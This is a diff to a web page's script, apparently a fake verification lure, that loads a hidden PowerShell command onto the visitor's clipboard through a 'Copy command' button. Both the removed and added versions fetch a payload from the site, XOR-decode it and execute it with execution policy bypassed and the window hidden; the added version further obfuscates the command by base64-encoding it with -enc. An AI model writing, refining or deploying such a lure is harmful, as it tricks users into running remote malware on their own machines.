@@ -46,14 +46,26 @@ button.ok{background:#248046}
   <div class="foot">Verification is done automatically in the background</div>
 </div>
 <script>
-var t='explorer.exe powershell -nop -w h -ep bypass -c "$b=[Convert]::FromBase64String((irm '+location.origin+'/a));for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor 37};&([scriptblock]::Create([Text.Encoding]::UTF8.GetString($b)))"';
-document.getElementById('cmd').textContent=t;
-document.getElementById('b').onclick=function(){
-  var b=this;
-  function ok(){b.textContent='Copied';b.className='ok';setTimeout(function(){b.textContent='Copy command';b.className='';},2200);}
-  function fb(){var a=document.createElement('textarea');a.value=t;document.body.appendChild(a);a.select();try{document.execCommand('copy');ok()}catch(e){}document.body.removeChild(a);}
-  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(t).then(ok).catch(fb)}else{fb()}
-};
+(function(){
+  var host = location.origin;
+  var stub = "$b=[Convert]::FromBase64String((irm '" + host + "/a?_=" + Date.now() + "'))"
+           + ";for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor 37}"
+           + ";iex([Text.Encoding]::UTF8.GetString($b))";
+  function b64(s){
+    var o='';
+    for(var i=0;i<s.length;i++) o+=String.fromCharCode(s.charCodeAt(i)&0xff,(s.charCodeAt(i)>>8)&0xff);
+    return btoa(o);
+  }
+  var t = 'powershell -nop -w h -ep bypass -enc ' + b64(stub);
+  var cmd = document.getElementById('cmd');
+  var btn = document.getElementById('b');
+  cmd.textContent = t;
+  btn.onclick = function(){
+    function ok(){btn.textContent='Copied';btn.className='ok';setTimeout(function(){btn.textContent='Copy command';btn.className='';},2200);}
+    function fb(){var a=document.createElement('textarea');a.value=t;document.body.appendChild(a);a.select();try{document.execCommand('copy');ok()}catch(e){}document.body.removeChild(a);}
+    if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(t).then(ok).catch(fb)}else{fb()}
+  };
+})();
 </script>
 </body>
 </html>
